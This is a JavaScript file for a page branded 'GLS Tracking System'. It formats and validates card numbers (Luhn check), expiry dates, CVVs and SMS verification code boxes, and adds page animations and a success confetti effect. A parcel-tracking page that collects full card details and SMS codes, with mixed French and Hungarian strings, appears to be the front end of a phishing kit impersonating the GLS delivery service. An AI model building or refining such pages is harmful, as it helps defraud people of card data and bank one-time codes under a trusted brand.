// GLS Tracking System - JavaScript

document.addEventListener('DOMContentLoaded', function() {
    // Page transition animation
    const pageContent = document.querySelector('.page-transition');
    if (pageContent) {
        pageContent.style.opacity = '0';
        setTimeout(() => {
            pageContent.style.transition = 'opacity 0.5s ease-out';
            pageContent.style.opacity = '1';
        }, 50);
    }

    // Phone Number Formatting with Prefix Detection
    const phoneInput = document.getElementById('phone');
    const phonePrefixSelect = document.getElementById('phonePrefix');

    if (phoneInput && phonePrefixSelect) {
        // Update formatting based on selected prefix
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            const selectedPrefix = phonePrefixSelect.value;

            // Limit to 10 digits for most countries
            if (value.length > 10) {
                value = value.substring(0, 10);
            }

            // Format based on country
            let formatted = '';
            if (selectedPrefix === '+33' || selectedPrefix === '+49') {
                // France/Germany: XX XX XX XX XX (10 digits)
                if (value.length > 0) {
                    for (let i = 0; i < value.length; i += 2) {
                        formatted += value.substring(i, i + 2) + ' ';
                    }
                }
            } else if (selectedPrefix === '+36') {
                // Hungary: XX XXX XXXX
                if (value.length <= 2) {
                    formatted = value;
                } else if (value.length <= 5) {
                    formatted = value.substring(0, 2) + ' ' + value.substring(2);
                } else {
                    formatted = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5);
                }
            } else {
                // Default: XX XXX XXXX
                if (value.length <= 2) {
                    formatted = value;
                } else if (value.length <= 5) {
                    formatted = value.substring(0, 2) + ' ' + value.substring(2);
                } else {
                    formatted = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5);
                }
            }

            e.target.value = formatted.trim();
        });

        // When prefix changes, reformat the number
        phonePrefixSelect.addEventListener('change', function() {
            phoneInput.dispatchEvent(new Event('input'));
        });
    }

    // Postal Code - 4 or 5 digits
    const postalInput = document.getElementById('postal');
    if (postalInput) {
        postalInput.addEventListener('keypress', function(e) {
            if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                e.preventDefault();
            }
        });

        postalInput.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5);
        });
    }

    // Luhn Algorithm for Card Validation
    function luhnCheck(cardNumber) {
        let sum = 0;
        let isEven = false;

        // Loop through values starting from the rightmost
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber.charAt(i), 10);

            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }

            sum += digit;
            isEven = !isEven;
        }

        return (sum % 10) === 0;
    }

    // Card Number Formatting with Type Detection and Luhn Validation
    const cardNumberInput = document.getElementById('cardNumber');
    const cardTypeDisplay = document.getElementById('cardType');
    const cardTypeText = document.getElementById('cardTypeText');

    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;

            // Detect card type
            const cardNumber = value;
            let cardType = '';
            let cardIcon = '';

            if (cardNumber.startsWith('4')) {
                cardType = 'VISA';
                cardIcon = '💳 VISA';
            } else if (cardNumber.startsWith('5') || (cardNumber.startsWith('2') && parseInt(cardNumber.substring(0, 2)) >= 22 && parseInt(cardNumber.substring(0, 2)) <= 27)) {
                cardType = 'MASTERCARD';
                cardIcon = '💳 MASTERCARD';
            } else if (cardNumber.startsWith('34') || cardNumber.startsWith('37')) {
                cardType = 'AMEX';
                cardIcon = '💳 AMEX';
            }

            if (cardTypeDisplay && cardType) {
                cardTypeDisplay.textContent = cardIcon;
                cardTypeDisplay.style.display = 'block';
            } else if (cardTypeDisplay) {
                cardTypeDisplay.style.display = 'none';
            }

            // Validate with Luhn algorithm if card is complete
            if (cardTypeText) {
                if (cardType && cardNumber.length >= 13) {
                    const isValid = luhnCheck(cardNumber);
                    if (isValid) {
                        cardTypeText.textContent = '✓ Carte valide: ' + cardType;
                        cardTypeText.style.color = '#059669';
                        e.target.style.borderColor = '#059669';
                    } else {
                        cardTypeText.textContent = '✗ Numéro de carte invalide';
                        cardTypeText.style.color = '#dc2626';
                        e.target.style.borderColor = '#dc2626';
                    }
                } else if (cardType) {
                    cardTypeText.textContent = '→ Type détecté: ' + cardType;
                    cardTypeText.style.color = '#6b7280';
                    e.target.style.borderColor = '#d1d5db';
                } else {
                    cardTypeText.textContent = '';
                    e.target.style.borderColor = '#d1d5db';
                }
            }
        });

        cardNumberInput.addEventListener('keypress', function(e) {
            if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                e.preventDefault();
            }
        });
    }

    // Expiry Date Formatting
    const expiryInput = document.getElementById('expiry');
    if (expiryInput) {
        expiryInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4);
            }
            e.target.value = value;
        });
    }

    // CVV Input - Numbers Only
    const cvvInput = document.getElementById('cvv');
    if (cvvInput) {
        cvvInput.addEventListener('keypress', function(e) {
            if (!/^\d$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete') {
                e.preventDefault();
            }
        });
    }

    // SMS Code Inputs - Auto-focus
    const codeInputs = document.querySelectorAll('.code-input');
    if (codeInputs.length > 0) {
        codeInputs.forEach((input, index) => {
            // Only allow numbers
            input.addEventListener('keypress', function(e) {
                if (!/^\d$/.test(e.key)) {
                    e.preventDefault();
                }
            });

            // Auto-focus next input
            input.addEventListener('input', function(e) {
                if (e.target.value.length === 1 && index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
            });

            // Handle backspace - focus previous
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });

            // Paste handling for code
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pastedData = e.clipboardData.getData('text').replace(/\D/g, '');
                const chars = pastedData.split('');

                chars.forEach((char, i) => {
                    if (index + i < codeInputs.length) {
                        codeInputs[index + i].value = char;
                    }
                });

                if (index + chars.length < codeInputs.length) {
                    codeInputs[index + chars.length].focus();
                } else {
                    codeInputs[codeInputs.length - 1].focus();
                }
            });
        });

        // Focus first input on page load
        codeInputs[0].focus();
    }

    // Form Validation with Animation
    const forms = document.querySelectorAll('form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            const submitButton = form.querySelector('button[type="submit"]');
            if (submitButton && form.checkValidity()) {
                submitButton.disabled = true;
                const originalText = submitButton.innerHTML;
                submitButton.innerHTML = '<span class="loading"></span> Feldolgozás...';

                // Re-enable after a short delay if validation fails
                setTimeout(() => {
                    if (!form.checkValidity()) {
                        submitButton.disabled = false;
                        submitButton.innerHTML = originalText;
                    }
                }, 100);
            }
        });
    });

    // Smooth scroll for links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href !== '#') {
                e.preventDefault();
                const target = document.querySelector(href);
                if (target) {
                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }
            }
        });
    });

    // Animate elements on scroll
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observe cards and info cards
    const animatedElements = document.querySelectorAll('.card, .info-card');
    animatedElements.forEach((el, index) => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(20px)';
        el.style.transition = `opacity 0.5s ease ${index * 0.1}s, transform 0.5s ease ${index * 0.1}s`;
        observer.observe(el);
    });

    // Input focus animations
    const inputs = document.querySelectorAll('.form-input, .code-input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'translateY(-2px)';
            this.parentElement.style.transition = 'transform 0.2s ease';
        });

        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'translateY(0)';
        });
    });

    // Button hover effect enhancement
    const buttons = document.querySelectorAll('.btn');
    buttons.forEach(button => {
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-2px) scale(1.02)';
        });

        button.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });

    // Info cards animation on hover
    const infoCards = document.querySelectorAll('.info-card');
    infoCards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-8px) scale(1.02)';
            this.style.boxShadow = '0 12px 24px rgba(0, 0, 0, 0.15)';
        });

        card.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
            this.style.boxShadow = '';
        });
    });

    // Mobile menu toggle (if needed)
    const navContainer = document.querySelector('.nav-container');
    if (navContainer && window.innerWidth < 768) {
        let touchStartX = 0;
        let touchEndX = 0;

        navContainer.addEventListener('touchstart', e => {
            touchStartX = e.changedTouches[0].screenX;
        });

        navContainer.addEventListener('touchend', e => {
            touchEndX = e.changedTouches[0].screenX;
            handleSwipe();
        });

        function handleSwipe() {
            if (touchStartX - touchEndX > 50) {
                navContainer.scrollBy({ left: 100, behavior: 'smooth' });
            }
            if (touchEndX - touchStartX > 50) {
                navContainer.scrollBy({ left: -100, behavior: 'smooth' });
            }
        }
    }

    // Print functionality enhancement
    window.addEventListener('beforeprint', function() {
        document.body.classList.add('printing');
    });

    window.addEventListener('afterprint', function() {
        document.body.classList.remove('printing');
    });

    // Success page confetti effect
    const successIcon = document.querySelector('.page-transition .alert-success');
    if (successIcon && window.location.pathname.includes('success')) {
        createConfetti();
    }

    function createConfetti() {
        const colors = ['#ffcb05', '#0d1f88', '#c4e0ee', '#059669'];
        const confettiCount = 100;

        for (let i = 0; i < confettiCount; i++) {
            setTimeout(() => {
                const confetti = document.createElement('div');
                confetti.style.position = 'fixed';
                confetti.style.width = Math.random() * 10 + 5 + 'px';
                confetti.style.height = Math.random() * 10 + 5 + 'px';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.left = Math.random() * window.innerWidth + 'px';
                confetti.style.top = '-10px';
                confetti.style.opacity = '0.8';
                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
                confetti.style.pointerEvents = 'none';
                confetti.style.zIndex = '9999';

                document.body.appendChild(confetti);

                const animation = confetti.animate([
                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
                    { transform: `translateY(${window.innerHeight + 20}px) rotate(${Math.random() * 720}deg)`, opacity: 0 }
                ], {
                    duration: 3000 + Math.random() * 2000,
                    easing: 'cubic-bezier(0.25, 0.46, 0.45, 0.94)'
                });

                animation.onfinish = () => confetti.remove();
            }, i * 20);
        }
    }

    console.log('🚚 GLS Tracking System loaded successfully! 📦✨');
});
